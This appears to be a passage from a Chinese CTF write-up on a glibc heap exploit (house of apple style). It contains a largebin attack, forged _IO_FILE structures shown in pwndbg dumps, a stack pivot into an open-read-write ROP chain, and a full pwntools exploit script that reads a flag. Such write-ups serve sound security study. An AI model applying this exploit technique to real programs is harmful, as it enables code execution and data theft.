    pl+=p64(magic_gadget)
    
    add_rsp18=libc_base+0x000000000003a8a1
    syscall=libc_base+0xea5b9
    
    orw = b'./flag\x00\x00'+p64(add_rsp18)+p64(0) #3.add rsp, 0x18 ; ret
    orw += p64(heap_base+0x1218-0x28) #1.指向leave_ret的地址
    #close
    orw += p64(leave_ret) #2.迁移后指向add_rsp18的地址
    orw += p64(pop_rdi)   #4.rsp+0x18后指向的地址
    orw += p64(0)
    orw += p64(close_addr)
    #open
    orw += p64(pop_rdi)
    orw += p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(pop_rax) + p64(2)
    orw += p64(syscall)
    #read
    orw += p64(pop_rdi) + p64(0)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(1)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(write_addr)
    
    pl+=orw
    
    add(0,0x428,pl) #
    
    add(1,0x460,'bbb')
    add(2,0x418,'ccc') #
    delete(0)
    
    add(3,0x460,'ddd') #chunk0-->largebin
    delete(2)
    
    pll=p64(libc_base+0x21a0d0)*2+p64(heap_base+0xfc0)+p64(stderr-0x20)
    edit(0,pll)
    
    add(4,0x440,'eee')  #largebin attack
    add(5,0x418,'fff')  #recycle chunk2
    

**_IO_FILE_plus**

    
    
    pwndbg> p *(struct _IO_FILE_plus *) 0x000055d30da0bfc0
    $3 = {
      file = {
        _flags = 0,
        _IO_read_ptr = 0x431 <error: Cannot access memory at address 0x431>,
        _IO_read_end = 0x7f463881a0d0 <main_arena+1104> "\300\240\201\070F\177",
        _IO_read_base = 0x7f463881a0d0 <main_arena+1104> "\300\240\201\070F\177",
        _IO_write_base = 0x55d30da0bfc0 "",
        _IO_write_ptr = 0x7f463881a840 <_IO_2_1_stdout_+192> "",
        _IO_write_end = 0x0,
        _IO_buf_base = 0x0,
        _IO_buf_end = 0x0,
        _IO_save_base = 0x55d30da0c1f8 "./flag",
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x0,
        _fileno = 0,
        _flags2 = 0,
        _old_offset = 0,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x7f463881ba60 <_IO_stdfile_2_lock>,
        _offset = 0,
        _codecvt = 0x0,
        _wide_data = 0x55d30da0c0a0,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = -1,
        _unused2 = '\000' <repeats 19 times>
      },
      vtable = 0x7f46388160c0 <_IO_wfile_jumps>
    }
    

**_IO_wide_data**

    
    
    pwndbg>  p *(struct _IO_wide_data*)   0x55d30da0c0a0
    $4 = {
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _IO_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _IO_last_state = {
        __count = 0,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _codecvt = {
        __cd_in = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        },
        __cd_out = {
          step = 0x0,
          step_data = {
            __outbuf = 0x0,
            __outbufend = 0x0,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 0,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        }
      },
      _shortbuf = L"",
      _wide_vtable = 0x55d30da0c188
    }
    

**_IO_jump_t**

    
    
    pwndbg>  p  *(const struct _IO_jump_t *) 0x55d30da0c188
    $5 = {
      __dummy = 0,
      __dummy2 = 0,
      __finish = 0x0,
      __overflow = 0x0,
      __underflow = 0x0,
      __uflow = 0x0,
      __pbackfail = 0x0,
      __xsputn = 0x0,
      __xsgetn = 0x0,
      __seekoff = 0x0,
      __seekpos = 0x0,
      __setbuf = 0x0,
      __sync = 0x0,
      __doallocate = 0x7f463876a1fa <svcudp_reply+26>,
      __read = 0x67616c662f2e,
      __write = 0x7f463863a8a1 <__bindtextdomain+49>,
      __seek = 0x0,
      __close = 0x55d30da0c1f0,
      __stat = 0x7f46386562ec <__mpn_mul_n+156>,
      __showmanyc = 0x7f463862a3e5 <iconv+197>,
      __imbue = 0x0
    }
    

‍

**修改top_chunk大小：**

    
    
    add(6,0x460,b'ggg')
    add(7,0x430,b'hhh')
    delete(4)
    add(8,0x460,b'iii') #chunk4 --> largebin
    
    chunk8=heap_base+0x2df0
    top_chunk_3=heap_base+0x3260+3
    
    plll=p64(chunk8+0x30)+p64(libc_base+0x21a0e0)+p64(chunk8+0x30)+p64(top_chunk_3-0x20)
    edit(4,plll)
    
    delete(7)
    delete(15)
    
    add(9,0x450,b'a') #largebin attack   top_size-->0x55
    

‍

**触发IO调用：**

    
    
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(1))
    p.sendlineafter("plz input your cat idx:\n",str(10))
    #dbg()
    p.sendlineafter("plz input your cat size:\n",str(0x468))
    

‍

##### **触发流程：**

> calloc
>
> ‍
>
> _int_malloc
>
> ‍
>
> sysmalloc
>
> ‍
>
> __malloc_assert
>
> ‍
>
> __fxprintf
>
> ‍
>
> locked_vfxprintf
>
> ‍
>
> __vfprintf_internal
>
> ‍
>
> _IO_wfile_xsputn
>
> _IO_wdefault_xsputn
>
> _IO_wfile_overflow
>
> _IO_wdoallocbuf
>
> ‍
>
> magic_gadget
>
> ​  
>
> ![](./img/4717747241231086588.png)  
>  ​
>
> leave_ret
>
> add_rsp18
>
> orw
>
> ​  
>
> ![](./img/5044991481700323240.png)

>

> ​

​​  
![](./img/2915045885680546999.png)  
​​​​

​​  
![](./img/614022301285643982.png)  
​​​

​​  
![](./img/8468164383711954192.png)  
​​​

​​  
![](./img/5035477296828593567.png)  
​​

‍

##### 完整exp:

    
    
    from pwn import *
    p=process('./pwn')
    libc=ELF('./libc.so.6')
    context.log_level='debug'
    
    s       = lambda data               :p.send(data)
    sa      = lambda x, y               :p.sendafter(x, y)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda x, y               :p.sendlineafter(x, y)
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    
    def add(idx,size,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n',str(1))
        sla('plz input your cat idx:\n',str(idx))
        sla('plz input your cat size:\n',str(size))
        sa('plz input your content:\n',cont)
    def delete(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(2))
        sla('plz input your cat idx:\n',str(idx))
    def show(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(3))
        sla('plz input your cat idx:\n',str(idx))
    def edit(idx,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(4))
        sla('plz input your cat idx:\n',str(idx))
        sa('plz input your content:\n', cont)
    
    sa('mew mew mew~~~~~~','LOGIN | r00t QWB QWXFadmin')
    
    
    add(15,0x450,b'15s')
    add(14,0x450,b'14s')
    delete(15)
    add(13,0x460,b'13s')
    show(15)
    
    libc_base=l64()-0x21a0e0
    li(hex(libc_base))
    
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x290
    li(hex(heap_base))
    
    IO_list_all= libc_base + libc.sym['_IO_list_all']
    lock = libc_base+0x21ba60
    magic_gadget = libc_base+0x16a1fa
    wfile= libc_base + libc.sym['_IO_wfile_jumps']
    stderr = libc_base + libc.sym['stderr']
    
    open_addr = libc_base + libc.sym['open']
    read_addr = libc_base + libc.sym['read']
    write_addr = libc_base + libc.sym['write']
    close_addr= libc_base + libc.sym['close']
    pop_rax=libc_base+0x0000000000045eb0
    pop_rdi=libc_base+0x000000000002a3e5
    pop_rsi=libc_base+0x000000000002be51
    pop_rdx12=libc_base+0x000000000011f497
    leave_ret = libc_base + libc.search(asm('leave;ret;')).__next__()
    chunk0=heap_base+0xfc0
    orw_addr=chunk0 + 0xe0 + 0xe8 + 0x70
    li('orw_addr = '+hex(orw_addr))
    
    add(12,0x450,b'12s') #recycle chunk15
    
    pl=p64(0)*7
    pl+=p64(orw_addr)
    pl+=p64(0)*7
    pl+=p64(lock)
    pl+=p64(0)*2
    pl+=p64(chunk0 + 0xe0) 
    pl+=p64(0)*6
    pl+=p64(wfile)
    
    pl+=p64(0)*0x1c
    pl+=p64(chunk0 + 0xe0 + 0xe8)
    
    pl+=p64(0)*0xd
    pl+=p64(magic_gadget)
    
    add_rsp18=libc_base+0x000000000003a8a1
    syscall=libc_base+0xea5b9
    
    orw = b'./flag\x00\x00'+p64(add_rsp18)+p64(0)+p64(heap_base+0x1218-0x28)
    #close
    orw += p64(leave_ret)
    orw += p64(pop_rdi)
    orw += p64(0)
    orw += p64(close_addr)
    #open
    orw += p64(pop_rdi)
    orw += p64(orw_addr)
    orw += p64(pop_rsi) + p64(0)
    orw += p64(pop_rax) + p64(2)
    orw += p64(syscall)
    #read
    orw += p64(pop_rdi) + p64(0)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(read_addr)
    #puts
    orw += p64(pop_rdi) + p64(1)
    orw += p64(pop_rsi) + p64(orw_addr + 0x100)
    orw += p64(pop_rdx12) + p64(0x50) + p64(0)
    orw += p64(write_addr)
    
    pl+=orw
    
    add(0,0x428,pl)
    
    add(1,0x460,'bbb')
    add(2,0x418,'ccc') 
    delete(0)
    
    add(3,0x460,'ddd')
    delete(2)
    
    pll=p64(libc_base+0x21a0d0)*2+p64(heap_base+0xfc0)+p64(stderr-0x20)
    edit(0,pll)
    
    add(4,0x440,'eee')  #attack
    add(5,0x418,'fff')  #recycle chunk2
    
    add(6,0x460,b'ggg')
    add(7,0x430,b'hhh')
    delete(4)
    add(8,0x460,b'iii') #chunk4 --> largebin
    
    chunk8=heap_base+0x2df0
    top_chunk_3=heap_base+0x3260+3
    
    plll=p64(chunk8+0x30)+p64(libc_base+0x21a0e0)+p64(chunk8+0x30)+p64(top_chunk_3-0x20)
    edit(4,plll)
    
    delete(7)
    delete(15)
    
    add(9,0x450,b'a') #largebin attack   top_size-->0x55
    
    p.sendafter("mew mew mew~~~~~~\n",'CAT | r00t QWB QWXF$\xff')
    p.sendlineafter("plz input your cat choice:\n",str(1))
    p.sendlineafter("plz input your cat idx:\n",str(10))
    #dbg()
    p.sendlineafter("plz input your cat size:\n",str(0x468))
    
    
    
    itr()
    

​​​  
![](./img/3547732169840684289.png)  
​​​

‍

‍

### 参考：

感谢roderick、ZIKH26、pursue、winmt师傅们的博客 orz

[[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com
(kanxue.com)](https://bbs.kanxue.com/thread-273832.htm)

[关于house of apple的学习总结 | ZIKH26's
Blog](https://zikh26.github.io/posts/19609dd.html#house-of-apple%EF%BC%9A)

[学不完的IO - Pursue
(rmrfsad.github.io)](https://rmrfsad.github.io/2022/08/14/Pwn/io/#House-Of-Apple2)

[house of apple - winmt - 博客园
(cnblogs.com)](https://www.cnblogs.com/winmt/articles/16530875.html)

‍

‍

